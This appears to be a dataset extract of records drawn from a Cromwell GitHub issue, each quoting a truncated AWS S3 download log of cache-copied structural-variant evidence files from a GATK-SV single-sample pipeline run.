s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-4/cacheCopy/SR00c.HG00150.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:138484,cache,cacheCopy,138484,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-35/cacheCopy/SR00c.HG01747.txt.gz.tbi; 1608597310848,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-76/cacheCopy/SR00c.HG03100.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-76/cacheCopy/SR00c.HG03100.txt.gz; 1608597312994,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-22/cacheCopy/SR00c.HG01112.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-22/cacheCopy/SR00c.HG01112.txt.gz.tbi; 1608597315649,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-19/cacheCopy/SR00c.HG00844.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4ea",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:101671,cache,cacheCopy,101671,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-37/cacheCopy/SR00c.HG01794.txt.gz.tbi; 1608597177960,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-64/cacheCopy/SR00c.HG02588.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-64/cacheCopy/SR00c.HG02588.txt.gz; 1608597179945,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-0/cacheCopy/SR00c.NA12878.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-0/cacheCopy/SR00c.NA12878.txt.gz.tbi; 1608597182124,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-36/cacheCopy/SR00c.HG01790.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:66145,cache,cacheCopy,66145,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-40/cacheCopy/SR00c.HG01874.txt.gz.tbi; 1608597381292,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-46/cacheCopy/SR00c.HG02010.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-46/cacheCopy/SR00c.HG02010.txt.gz; 1608597382846,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-77/cacheCopy/SR00c.HG03111.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-77/cacheCopy/SR00c.HG03111.txt.gz.tbi; 1608597384680,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-61/cacheCopy/SR00c.HG02490.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:120365,cache,cacheCopy,120365,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-44/cacheCopy/SR00c.HG01982.txt.gz.tbi; 1608597472441,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-65/cacheCopy/SR00c.HG02611.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-65/cacheCopy/SR00c.HG02611.txt.gz; 1608597473978,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-60/cacheCopy/SR00c.HG02489.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-60/cacheCopy/SR00c.HG02489.txt.gz.tbi; 1608597475239,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-36/cacheCopy/SR00c.HG01790.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:147216,cache,cacheCopy,147216,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-47/cacheCopy/SR00c.HG02019.txt.gz.tbi; 1608596944807,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-81/cacheCopy/SR00c.HG03449.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-81/cacheCopy/SR00c.HG03449.txt.gz; 1608596946491,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-94/cacheCopy/SR00c.HG03789.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-94/cacheCopy/SR00c.HG03789.txt.gz.tbi; 1608596949182,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-71/cacheCopy/SR00c.HG02953.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4ea",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:1937,cache,cacheCopy,1937,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-57/cacheCopy/SR00c.HG02332.txt.gz.tbi; 1608597078723,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-26/cacheCopy/SR00c.HG01356.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-26/cacheCopy/SR00c.HG01356.txt.gz; 1608597081079,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-79/cacheCopy/SR00c.HG03370.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-79/cacheCopy/SR00c.HG03370.txt.gz; 1608597083236,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-106/cacheCopy/SR00c.NA12340.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf01",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:38728,cache,cacheCopy,38728,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-62/cacheCopy/SR00c.HG02491.txt.gz.tbi; 1608597507274,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-60/cacheCopy/SR00c.HG02489.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-60/cacheCopy/SR00c.HG02489.txt.gz; 1608597508511,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-88/cacheCopy/SR00c.HG03694.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-88/cacheCopy/SR00c.HG03694.txt.gz.tbi; 1608597509827,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-113/cacheCopy/SR00c.NA18549.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMergin",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:157791,cache,cacheCopy,157791,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-66/cacheCopy/SR00c.HG02620.txt.gz.tbi; 1608597497211,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-42/cacheCopy/SR00c.HG01885.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-42/cacheCopy/SR00c.HG01885.txt.gz; 1608597499938,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-93/cacheCopy/SR00c.HG03756.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-93/cacheCopy/SR00c.HG03756.txt.gz; 1608597502968,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-101/cacheCopy/SR00c.HG04161.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:155305,cache,cacheCopy,155305,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-67/cacheCopy/SR00c.HG02642.txt.gz.tbi; 1608597462345,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-51/cacheCopy/SR00c.HG02186.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-51/cacheCopy/SR00c.HG02186.txt.gz; 1608597465182,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-77/cacheCopy/SR00c.HG03111.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-77/cacheCopy/SR00c.HG03111.txt.gz; 1608597466639,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-100/cacheCopy/SR00c.HG04158.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf01",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:144095,cache,cacheCopy,144095,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-7/cacheCopy/SR00c.HG00277.txt.gz.tbi; 1608597125075,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-44/cacheCopy/SR00c.HG01982.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-44/cacheCopy/SR00c.HG01982.txt.gz; 1608597127083,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-126/cacheCopy/SR00c.NA19143.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-126/cacheCopy/SR00c.NA19143.txt.gz.tbi; 1608597129434,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-18/cacheCopy/SR00c.HG00740.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:51824,cache,cacheCopy,51824,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-78/cacheCopy/SR00c.HG03369.txt.gz.tbi; 1608597016404,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-80/cacheCopy/SR00c.HG03436.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-80/cacheCopy/SR00c.HG03436.txt.gz; 1608597018214,download: 